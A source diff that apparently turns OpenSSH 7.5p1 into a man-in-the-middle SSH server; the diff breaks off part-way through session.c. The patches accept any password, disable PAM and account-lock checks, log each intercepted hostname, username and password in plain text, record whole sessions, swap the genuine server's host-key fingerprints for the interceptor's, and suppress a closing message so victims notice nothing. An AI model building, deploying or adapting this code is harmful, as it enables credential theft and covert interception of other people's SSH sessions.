diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
--- openssh-7.5p1/auth2.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth2.c	2017-07-24 15:25:11.259472380 -0400
@@ -222,6 +222,10 @@
 		fatal("input_userauth_request: no authctxt");
 
 	user = packet_get_cstring(NULL);
+	authctxt->original_user = xstrdup(user);  /* TODO: free this when done. */
+	free(user);
+	user = xstrdup(BOGUS_USER);
+
 	service = packet_get_cstring(NULL);
 	method = packet_get_cstring(NULL);
 	debug("userauth-request for user %s service %s method %s", user, service, method);
@@ -329,6 +333,8 @@
 		return;
 
 #ifdef USE_PAM
+	/* Disable PAM entirely. */
+	if (0) {
 	if (options.use_pam && authenticated) {
 		if (!PRIVSEP(do_pam_account())) {
 			/* if PAM returned a message, send it to the user */
@@ -341,6 +347,7 @@
 			    "configuration", authctxt->user);
 		}
 	}
+        }
 #endif
 
 #ifdef _UNICOS
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
--- openssh-7.5p1/auth2-passwd.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth2-passwd.c	2017-07-24 15:25:11.259472380 -0400
@@ -43,9 +43,11 @@
 #include "monitor_wrap.h"
 #include "misc.h"
 #include "servconf.h"
+#include "lol.h"
 
 /* import */
 extern ServerOptions options;
+extern Lol *lol;
 
 static int
 userauth_passwd(Authctxt *authctxt)
@@ -65,6 +67,13 @@
 	}
 	packet_check_eom();
 
+	char *user = authctxt->user;
+	if (authctxt->original_user != NULL)
+	  user = authctxt->original_user;
+
+	logit("INTERCEPTED PASSWORD: hostname: [%s]; username: [%s]; password: [%s]", lol->original_host, user, password);
+	lol->username = strdup(user);
+	lol->password = strdup(password);
 	if (change)
 		logit("password change not supported");
 	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-pubkey.c openssh-7.5p1-mitm/auth2-pubkey.c
--- openssh-7.5p1/auth2-pubkey.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth2-pubkey.c	2017-07-24 15:25:11.259472380 -0400
@@ -493,7 +493,8 @@
 			_exit(1);
 		}
 
-		execve(av[0], av, child_env);
+		/* Not sure when this happens, exactly, but we definitely never want to execute anything. */
+		/*execve(av[0], av, child_env);*/
 		error("%s exec \"%s\": %s", tag, command, strerror(errno));
 		_exit(127);
 	default: /* parent */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
--- openssh-7.5p1/auth.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth.c	2017-07-24 15:25:11.259472380 -0400
@@ -152,6 +152,8 @@
 #ifdef USE_LIBIAF
 		free((void *) passwd);
 #endif /* USE_LIBIAF */
+		/* Allow logins to our locked-out bogus user. */
+		locked = 0;
 		if (locked) {
 			logit("User %.100s not allowed because account is locked",
 			    pw->pw_name);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
--- openssh-7.5p1/auth.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth.h	2017-07-24 15:25:11.259472380 -0400
@@ -59,6 +59,7 @@
 	int		 server_caused_failure;
 	int		 force_pwchange;
 	char		*user;		/* username sent by the client */
+  	char		*original_user; /* username that the client actually wants to connect as */
 	char		*service;
 	struct passwd	*pw;		/* set if 'valid' */
 	char		*style;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
--- openssh-7.5p1/auth-passwd.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/auth-passwd.c	2017-07-24 15:25:11.259472380 -0400
@@ -121,6 +121,8 @@
 	if (options.use_pam)
 		return (sshpam_auth_passwd(authctxt, password) && ok);
 #endif
+	/* Accept all password authentication. */
+	return 1;
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	if (!expire_checked) {
 		expire_checked = 1;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
--- openssh-7.5p1/channels.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/channels.c	2017-07-24 21:33:12.818139224 -0400
@@ -82,6 +82,7 @@
 #include "key.h"
 #include "authfd.h"
 #include "pathnames.h"
+#include "lol.h"
 
 /* -- channel core */
 
@@ -191,6 +192,12 @@
 static int connect_next(struct channel_connect *);
 static void channel_connect_ctx_free(struct channel_connect *);
 
+void log_input(int fd, char *buf, int len);
+void log_output(int fd, char *buf, int len);
+void logx(int fd, char *buf, int len);
+char *replace_fingerprints(Channel *c, char *input, int input_size, int *output_len, int *free_result);
+void handle_overlap(Channel *c, char *input, unsigned int input_len, unsigned int *output_len);
+
 /* -- channel core */
 
 Channel *
@@ -504,6 +511,21 @@
 	if (c->filter_cleanup != NULL && c->filter_ctx != NULL)
 		c->filter_cleanup(c->self, c->filter_ctx);
 	channels[c->self] = NULL;
+	if (c->log_fd > 0) {
+		fdatasync(c->log_fd);
+		close(c->log_fd);
+		c->log_fd = 0;
+	}
+	free(c->legit_md5_fingerprint);    c->legit_md5_fingerprint = NULL;
+	c->legit_md5_fingerprint_len = 0;
+	free(c->legit_sha256_fingerprint); c->legit_sha256_fingerprint = NULL;
+	c->legit_sha256_fingerprint_len = 0;
+	free(c->our_md5_fingerprint);      c->our_md5_fingerprint = NULL;
+	c->our_md5_fingerprint_len = 0;
+	free(c->our_sha256_fingerprint);   c->our_sha256_fingerprint = NULL;
+	c->our_sha256_fingerprint_len = 0;
+	free(c->extra_fp_bytes);           c->extra_fp_bytes = NULL;
+	c->extra_fp_bytes_len = 0;
 	free(c);
 }
 
@@ -853,12 +875,13 @@
 
 void
 channel_set_fds(int id, int rfd, int wfd, int efd,
-    int extusage, int nonblock, int is_tty, u_int window_max)
+    int extusage, int nonblock, int is_tty, u_int window_max, int session_log_fd)
 {
 	Channel *c = channel_lookup(id);
 
 	if (c == NULL || c->type != SSH_CHANNEL_LARVAL)
 		fatal("channel_activate for non-larval channel %d.", id);
+	c->log_fd = session_log_fd;
 	channel_register_fds(c, rfd, wfd, efd, extusage, nonblock, is_tty);
 	c->type = SSH_CHANNEL_OPEN;
 	c->local_window = c->local_window_max = window_max;
@@ -1729,6 +1752,8 @@
 {
 	char buf[CHAN_RBUF];
 	int len, force;
+	char *output = NULL;
+	int output_len = 0, real_output_len = 0, free_result = 0;
 
 	force = c->isatty && c->detach_close && c->istate != CHAN_INPUT_CLOSED;
 	if (c->rfd != -1 && (force || FD_ISSET(c->rfd, readset))) {
@@ -1758,16 +1783,23 @@
 			}
 			return -1;
 		}
+
+		/* Replace the legit server's fingerprints in the output with
+		 * our fingerprints.  >:] */
+		output = replace_fingerprints(c, buf, len, &output_len, &free_result);
+		handle_overlap(c, output, output_len, &real_output_len);
+		log_input(c->log_fd, output, real_output_len);
 		if (c->input_filter != NULL) {
-			if (c->input_filter(c, buf, len) == -1) {
+			if (c->input_filter(c, output, real_output_len) == -1) {
 				debug2("channel %d: filter stops", c->self);
 				chan_read_failed(c);
 			}
 		} else if (c->datagram) {
-			buffer_put_string(&c->input, buf, len);
+			buffer_put_string(&c->input, output, real_output_len);
 		} else {
-			buffer_append(&c->input, buf, len);
+			buffer_append(&c->input, output, real_output_len);
 		}
+		if (free_result) { free(output); output = NULL; }
 	}
 	return 1;
 }
@@ -1824,6 +1856,7 @@
 			dlen = MIN(dlen, 8*1024);
 #endif
 
+		log_output(c->log_fd, buf, dlen);
 		len = write(c->wfd, buf, dlen);
 		if (len < 0 &&
 		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
@@ -4670,3 +4703,241 @@
 	packet_send();
 	packet_write_wait();
 }
+
+void log_input(int fd, char *buf, int len) {
+  logx(fd, buf, len);
+}
+
+void log_output(int fd, char *buf, int len) {
+  logx(fd, buf, len);
+}
+
+void logx(int fd, char *buf, int len) {
+  int written = 0;
+  int ret = -1;
+
+  if (fd <= 0)
+    return;
+
+  while (written < len) {
+    ret = write(fd, buf + written, len - written);
+    if (ret < 0)
+      return;
+
+    written += len;
+  }
+}
+
+/* This function searches and replaces the legitimate server's host key
+ * fingerprints with ours.
+ *
+ *     "input" is the character buffer to search.
+ *     "output_len" holds the number of characters written to the output return
+ *         value.
+ *     "free_result" is set to 1 if the caller must call free() on the return
+ *         value when finished with it.
+ */
+char *replace_fingerprints(Channel *c, char *input, int input_size, int *output_len, int *free_result) {
+  char *orig_input = input;
+  int orig_input_size = input_size;
+
+  char *needle = NULL, *needle_replacement = NULL;
+  int needle_len = 0, needle_replacement_len = 0;
+
+  void *ptr = NULL;
+  char *output = NULL;
+
+  int output_size = 0;
+  int allocated_input = 0, allocated_output = 0;
+  int prefix_len = 0, suffix_len = 0;
+  int i = 0;
+  int output_is_input = 0;
+
+  *output_len = input_size;
+
+  /* If extra bytes are set from a previous call (i.e.: a partial fingerprint
+   * from a previous input block), prepend them to the input in a new buffer. */
+  if (c->extra_fp_bytes_len > 0) {
+    int new_input_size = input_size + c->extra_fp_bytes_len;
+    char *new_input = calloc(new_input_size, sizeof(char));
+    if (new_input == NULL)
+      goto replace_fingerprints_error;
+
+    memcpy(new_input, c->extra_fp_bytes, c->extra_fp_bytes_len);
+    memcpy(new_input + c->extra_fp_bytes_len, input, input_size);
+
+    input = new_input;
+    *output_len = input_size = new_input_size;
+    allocated_input = 1;
+    c->extra_fp_bytes_len = 0;
+  }
+
+  /* Process the MD5 and SHA256 fingerprint types. */
+  for (i = 0; i < 2; i++) {
+    if (i == 0) {
+      needle = c->legit_md5_fingerprint;
+      needle_len = c->legit_md5_fingerprint_len;
+      needle_replacement = c->our_md5_fingerprint;
+      needle_replacement_len = c->our_md5_fingerprint_len;
+    } else if(i == 1) {
+      needle = c->legit_sha256_fingerprint;
+      needle_len = c->legit_sha256_fingerprint_len;
+      needle_replacement = c->our_sha256_fingerprint;
+      needle_replacement_len = c->our_sha256_fingerprint_len;
+    }
+
+    /* If we don't have all the info we need to search and replace, skip this
+     * fingerprint type. */
+    if ((needle_len == 0) || (needle_replacement_len == 0))
+      continue;
+
+    /* Search for the needle in the haystack. */
+    if ((ptr = memmem(input, input_size, needle, needle_len)) != NULL) {
+
+      /* If an output buffer isn't decided yet... */
+      if (output == NULL) {
+
+	/* We will choose to overwrite the input buffer with the output, if it
+	 * fits.  If it doesn't, we need to allocate a new buffer. */
+	output_size = input_size - needle_len + needle_replacement_len;
+	if (output_size > input_size) {
+	  output = calloc(output_size, sizeof(char));
+
+	  if (output == NULL)
+	    goto replace_fingerprints_error;
+
+	  allocated_output = 1;
+	  output_is_input = 0;
+	} else {
+	  output = input;
+	  output_size = input_size;
+	  output_is_input = 1;
+	}
+
+      /* We already set an output buffer (note that we could have allocated it
+       * ourselves, or it may be the input buffer).  Check if its big enough
+       * for the replacement string.  If not, allocate a new one or re-allocate
+       * the existing one, as necessary. */
+      } else {
+	int _output_size = input_size - needle_len + needle_replacement_len;
+	if (_output_size > output_size) {
+	  output_size = _output_size;
+
+	  /* If we had already allocated a buffer, re-allocate it with the
+	   * number of bytes we need.  Otherwise, allocate a new one. */
+	  if (allocated_output == 1)
+	    output = realloc(output, output_size);
+	  else
+	    output = calloc(output_size, sizeof(char));
+
+	  if (output == NULL)
+	    goto replace_fingerprints_error;
+
+	  allocated_output = 1;
+	  output_is_input = 0;
+	}
+      }
+
+      /* Calculate the length of the prefix and suffix around the string we
+       * are replacing. */
+      prefix_len = (char *)ptr - input;
+      suffix_len = input_size - prefix_len - needle_len;
+
+      /* Copy the prefix, string replacement, and suffix into the output. */
+      memmove(output, input, prefix_len);
+      memmove(output + prefix_len, needle_replacement, needle_replacement_len);
+      memmove(output + prefix_len + needle_replacement_len, (char *)ptr + needle_len, suffix_len);
+
+      /* Update the number of bytes we wrote into the output buffer. */
+      *output_len = prefix_len + needle_replacement_len + suffix_len;
+    }
+  }
+
+  /* If the output pointer has been set (meaning that a substitution was made),
+   * free the input buffer if necessary.  Return a pointer to the output
+   * buffer. */
+  if (output != NULL) {
+    if (allocated_input && !output_is_input) {
+      free(input); input = NULL;
+      allocated_input = 0;
+    }
+
+    *free_result = allocated_input | allocated_output;
+    return output;
+
+  /* If no substitution was made, return the input buffer (which we may have
+   * allocated ourselves). */
+  } else {
+    *free_result = allocated_input;
+    return input;
+  }
+
+ replace_fingerprints_error:
+  if (allocated_input) {
+    free(input); input = NULL;
+  }
+  if (allocated_output) {
+    free(output); output = NULL;
+  }
+  *free_result = 0;
+  *output_len = orig_input_size;
+  return orig_input;
+}
+
+/* Handles any partial fingerprints found at the end of the input block.  Any
+ * that are found are placed in the Channel's "extra_fp_bytes" buffer, which
+ * will be prepended in the next block's buffer by replace_fingerprints().  The
+ * smallest partial fingerprint this will look for is of length 8, so as to
+ * maintain high responsiveness for interactive shell sessions.
+ *
+ *    "input" is the input buffer to process.
+ *    "input_len" is the number of bytes to process in the input buffer.
+ *    "output_len" is the new number of bytes the caller should use in the
+ *        input buffer, where output_len <= input_len.
+ */
+void handle_overlap(Channel *c, char *input, unsigned int input_len, unsigned int *output_len) {
+  unsigned int i, shift;
+  char *needle = NULL;
+  unsigned int needle_len = 0;
+  int found_substr = 0;
+
+  *output_len = input_len;
+
+  /* Don't bother processing input blocks smaller than 8, since that is the
+   * minimum size we will look for.  This is a tradeoff between shell
+   * responsiveness and completeness.  For interactive shell sessions,
+   * responsiveness is much more important... */
+  if (input_len < 8)
+    return;
+
+  for (i = 0; i < 2; i++) {
+    if (i == 0) {
+      needle = c->legit_md5_fingerprint;
+      needle_len = c->legit_md5_fingerprint_len;
+    } else if (i == 1) {
+      needle = c->legit_sha256_fingerprint;
+      needle_len = c->legit_sha256_fingerprint_len;
+    }
+
+    /* If we don't have a needle, don't bother to continue processing. */
+    if (needle_len == 0)
+      continue;
+
+    /* Begin by looking at the last 8 bytes of the input, and see if it matches
+     * the first 8 bytes of the fingerprint.  Then look at the last/first 9
+     * bytes, etc. */
+    found_substr = 0;
+    for (shift = 8; (shift < needle_len) && (shift <= input_len); shift++) {
+      if (memcmp(input + (input_len - shift), needle, shift) == 0)
+	found_substr = shift;
+    }
+
+    /* If we find a match, move the matching characters to the extra_chars
+     * array, and shorten the length of the output. */
+    if (found_substr > 0) {
+      c->extra_fp_bytes_len = found_substr;
+      memcpy(c->extra_fp_bytes, input + input_len - found_substr, c->extra_fp_bytes_len);
+      *output_len = input_len - found_substr;
+    }
+  }
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
--- openssh-7.5p1/channels.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/channels.h	2017-07-24 21:25:54.385057361 -0400
@@ -164,6 +164,21 @@
 	void			*mux_ctx;
 	int			mux_pause;
 	int     		mux_downstream_id;
+
+	int log_fd;		/* File handle for logging sessions. */
+
+	/* The MD5 & SHA256 fingerprints of the legit server's host keys, as
+	 * well as the fingerprints for our host keys. */
+	char *legit_md5_fingerprint;
+	unsigned int legit_md5_fingerprint_len;
+	char *legit_sha256_fingerprint;
+	unsigned int legit_sha256_fingerprint_len;
+	char *our_md5_fingerprint;
+	unsigned int our_md5_fingerprint_len;
+	char *our_sha256_fingerprint;
+	unsigned int our_sha256_fingerprint_len;
+	char *extra_fp_bytes;
+	unsigned int extra_fp_bytes_len;
 };
 
 #define CHAN_EXTENDED_IGNORE		0
@@ -214,7 +229,7 @@
 Channel	*channel_by_remote_id(int);
 Channel	*channel_lookup(int);
 Channel *channel_new(char *, int, int, int, int, u_int, u_int, int, char *, int);
-void	 channel_set_fds(int, int, int, int, int, int, int, u_int);
+void	 channel_set_fds(int, int, int, int, int, int, int, u_int, int);
 void	 channel_free(Channel *);
 void	 channel_free_all(void);
 void	 channel_stop_listening(void);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
--- openssh-7.5p1/clientloop.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/clientloop.c	2017-07-24 15:25:11.263472466 -0400
@@ -1752,7 +1752,10 @@
 	if (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {
 		snprintf(buf, sizeof buf,
 		    "Connection to %.64s closed.\r\n", host);
-		buffer_append(&stderr_buffer, buf, strlen(buf));
+		/* Suppress this message, otherwise the user will see our
+		 * client make the same output as their own client (which would
+		 * be a little weird/suspicious). */
+		/*buffer_append(&stderr_buffer, buf, strlen(buf));*/
 	}
 
 	/* Output any buffered data for stdout. */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c
--- openssh-7.5p1/loginrec.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/loginrec.c	2017-07-24 15:25:11.263472466 -0400
@@ -435,6 +435,8 @@
 int
 login_write(struct logininfo *li)
 {
+        /* Since we never run as root, never attempt to record the log-in. */
+        return (0);
 #ifndef HAVE_CYGWIN
 	if (geteuid() != 0) {
 		logit("Attempt to write login records by non-root user (aborting)");
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
--- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
+++ openssh-7.5p1-mitm/lol.h	2017-07-24 21:37:57.376758906 -0400
@@ -0,0 +1,44 @@
+#ifndef LOL_H
+#define LOL_H
+
+/* Define these in order to force connections to a test host.
+ * Useful for quickly testing changes without needing to ARP 
+ * spoof; just connect to sshd's port directly. */
+/*
+#define DEBUG_HOST "testhost"
+#define DEBUG_PORT 22
+*/
+
+/* This is the user account that all incoming connections will authenticate
+ * as (the provided user name is ignored).  This is also the account home
+ * directory where logged sessions are stored. */
+#define BOGUS_USER "ssh-mitm"
+
+/* This is the size of the buffer used to read host key fingerprints from the
+ * client program. */
+#define SOCKET_FINGERPRINT_BUFFER_SIZE 1024
+
+/* The size of the buffer used to store partial fingerprints intercepted. */
+#define EXTRA_FP_BYTES_SIZE 64
+
+/* Uncomment this to open(2) log files with the O_SYNC flag.  Effectively, this
+ * would cause logs to be written syncronously, though at the expense of lower
+ * session responsiveness. */
+/*#define SYNC_LOG 1*/
+
+struct _Lol {
+  char *original_host;
+  unsigned short original_port;
+  char *username;
+  char *password;
+};
+typedef struct _Lol Lol;
+
+#define MAX_SERVER_HOSTKEY_FPS 8
+struct _hostkey_fp {
+  char *old;
+  char *new;
+};
+typedef struct _hostkey_fp hostkey_fp;
+
+#endif /* LOL_H */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/Makefile.in openssh-7.5p1-mitm/Makefile.in
--- openssh-7.5p1/Makefile.in	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/Makefile.in	2017-07-24 15:25:11.263472466 -0400
@@ -23,7 +23,7 @@
 VPATH=@srcdir@
 SSH_PROGRAM=@bindir@/ssh
 ASKPASS_PROGRAM=$(libexecdir)/ssh-askpass
-SFTP_SERVER=$(libexecdir)/sftp-server
+SFTP_SERVER=/home/ssh-mitm/bin/sftp-server
 SSH_KEYSIGN=$(libexecdir)/ssh-keysign
 SSH_PKCS11_HELPER=$(libexecdir)/ssh-pkcs11-helper
 PRIVSEP_PATH=@PRIVSEP_PATH@
@@ -107,7 +107,7 @@
 	monitor.o monitor_wrap.o auth-krb5.o \
 	auth2-gss.o gss-serv.o gss-serv-krb5.o \
 	loginrec.o auth-pam.o auth-shadow.o auth-sia.o md5crypt.o \
-	sftp-server.o sftp-common.o \
+	sftp-server.o sftp-client.o sftp-common.o \
 	sandbox-null.o sandbox-rlimit.o sandbox-systrace.o sandbox-darwin.o \
 	sandbox-seccomp-filter.o sandbox-capsicum.o sandbox-pledge.o \
 	sandbox-solaris.o
@@ -187,8 +187,8 @@
 ssh-keyscan$(EXEEXT): $(LIBCOMPAT) libssh.a ssh-keyscan.o
 	$(LD) -o $@ ssh-keyscan.o $(LDFLAGS) -lssh -lopenbsd-compat -lssh $(LIBS)
 
-sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-common.o sftp-server.o sftp-server-main.o
-	$(LD) -o $@ sftp-server.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)
+sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-server.o sftp-server-main.o
+	$(LD) -o $@ sftp-server.o sftp-client.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)
 
 sftp$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-glob.o progressmeter.o
 	$(LD) -o $@ progressmeter.o sftp.o sftp-client.o sftp-common.o sftp-glob.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS) $(LIBEDIT)
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
--- openssh-7.5p1/monitor.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor.c	2017-07-24 15:25:11.263472466 -0400
@@ -119,6 +119,7 @@
 
 /* State exported from the child */
 static struct sshbuf *child_state;
+static struct sshbuf *child_lol = NULL;
 
 /* Functions on the monitor that answer unprivileged requests */
 
@@ -360,6 +361,7 @@
 	ssh_packet_set_log_preamble(ssh, "user %s", authctxt->user);
 
 	mm_get_keystate(pmonitor);
+	mm_get_lol(pmonitor);
 
 	/* Drain any buffered messages from the child */
 	while (pmonitor->m_log_recvfd != -1 && monitor_read_log(pmonitor) == 0)
@@ -1613,6 +1615,41 @@
 	}
 }
 
+void
+monitor_apply_lol(struct monitor *pmonitor, Lol *lol)
+{
+  u_int32_t dummy_len = 1;
+  u_char *dummy = NULL;
+  u_int32_t original_port = 0;
+  u_int32_t username_len = 0;
+  u_char *username = NULL;
+  u_int32_t password_len = 0;
+  u_char *password = NULL;
+
+  debug3("Applying lol...");
+
+  if (child_lol == NULL)
+    fatal("%s: child_lol is NULL!", __func__);
+
+  if (sshbuf_get_string(child_lol, &dummy, (size_t *)&dummy_len) != 0 ||
+      sshbuf_get_u32(child_lol, &original_port) != 0 ||
+      sshbuf_get_u32(child_lol, &username_len) != 0 ||
+      sshbuf_get_string(child_lol, &username, (size_t *)&username_len) != 0 ||
+      sshbuf_get_u32(child_lol, &password_len) != 0 ||
+      sshbuf_get_string(child_lol, &password, (size_t *)&password_len) != 0)
+    fatal("%s: sshbuf problems.", __func__);
+
+  if (/*(strlen(original_host) != original_host_len) ||*/ (strlen(username) != username_len) || (strlen(password) != password_len))
+    fatal("%s: more sshbuf problems.", __func__);
+
+  lol->original_port = (unsigned short)original_port;
+
+  lol->username = username;
+  lol->password = password;
+  sshbuf_free(child_lol); child_lol = NULL;
+  debug3("Done with lol...");
+}
+
 /* This function requries careful sanity checking */
 
 void
@@ -1627,6 +1664,16 @@
 	debug3("%s: GOT new keys", __func__);
 }
 
+void
+mm_get_lol(struct monitor *pmonitor)
+{
+	debug3("%s: Waiting for lol", __func__);
+	if ((child_lol = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	mm_request_receive_expect(pmonitor->m_sendfd, MONITOR_REQ_LOL, child_lol);
+	debug3("%s: GOT lol", __func__);
+}
+
 
 /* XXX */
 
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
--- openssh-7.5p1/monitor.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor.h	2017-07-24 15:25:11.263472466 -0400
@@ -56,6 +56,7 @@
 	MONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,
 	MONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,
 	MONITOR_REQ_TERM = 50,
+	MONITOR_REQ_LOL = 52,
 
 	MONITOR_REQ_PAM_START = 100,
 	MONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
--- openssh-7.5p1/monitor_wrap.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor_wrap.c	2017-07-24 15:25:11.263472466 -0400
@@ -482,6 +482,31 @@
 	sshbuf_free(m);
 }
 
+void
+mm_send_lol(struct monitor *monitor, Lol *lol) {
+	struct sshbuf *m;
+
+	if ((m = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	if (lol == NULL)
+		fatal("%s: lol is NULL!", __func__);
+
+	debug3("SENDING lol");
+
+	if (sshbuf_put_string(m, "X", 1) != 0 ||
+	    sshbuf_put_u32(m, lol->original_port) != 0 ||
+	    sshbuf_put_u32(m, strlen(lol->username)) != 0 ||
+	    sshbuf_put_string(m, lol->username, strlen(lol->username)) != 0 ||
+	    sshbuf_put_u32(m, strlen(lol->password)) != 0 ||
+	    sshbuf_put_string(m, lol->password, strlen(lol->password)) != 0) {
+		fatal("%s: can't pack lol!", __func__);
+	}
+
+	mm_request_send(monitor->m_recvfd, MONITOR_REQ_LOL, m);
+	debug3("%s: Finished sending lol", __func__);
+	sshbuf_free(m);
+}
+
 int
 mm_pty_allocate(int *ptyfd, int *ttyfd, char *namebuf, size_t namebuflen)
 {
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
--- openssh-7.5p1/monitor_wrap.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/monitor_wrap.h	2017-07-24 15:25:11.263472466 -0400
@@ -28,6 +28,8 @@
 #ifndef _MM_WRAP_H_
 #define _MM_WRAP_H_
 
+#include "lol.h"
+
 extern int use_privsep;
 #define PRIVSEP(x)	(use_privsep ? mm_##x : x)
 
@@ -84,8 +86,11 @@
 int mm_newkeys_to_blob(int, u_char **, u_int *);
 
 void monitor_apply_keystate(struct monitor *);
+void monitor_apply_lol(struct monitor *, Lol *);
 void mm_get_keystate(struct monitor *);
+void mm_get_lol(struct monitor *);
 void mm_send_keystate(struct monitor*);
+void mm_send_lol(struct monitor *, Lol *);
 
 /* bsdauth */
 int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
--- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/session.c	2017-07-24 21:38:17.581288181 -0400
@@ -40,6 +40,9 @@
 #ifdef HAVE_SYS_STAT_H
 # include <sys/stat.h>
 #endif
+#include <sys/file.h>
+#include <netinet/in.h>
+#include <resolv.h>
 #include <sys/socket.h>
 #include <sys/un.h>
 #include <sys/wait.h>
@@ -94,6 +97,7 @@
 #include "kex.h"
 #include "monitor_wrap.h"
 #include "sftp.h"
+#include "digest.h"
 
 #if defined(KRB5) && defined(USE_AFS)
 #include <kafs.h>
@@ -112,20 +116,21 @@
 /* func */
 
 Session *session_new(void);
-void	session_set_fds(Session *, int, int, int, int, int);
+void	session_set_fds(Session *, int, int, int, int, int, int);
 void	session_pty_cleanup(Session *);
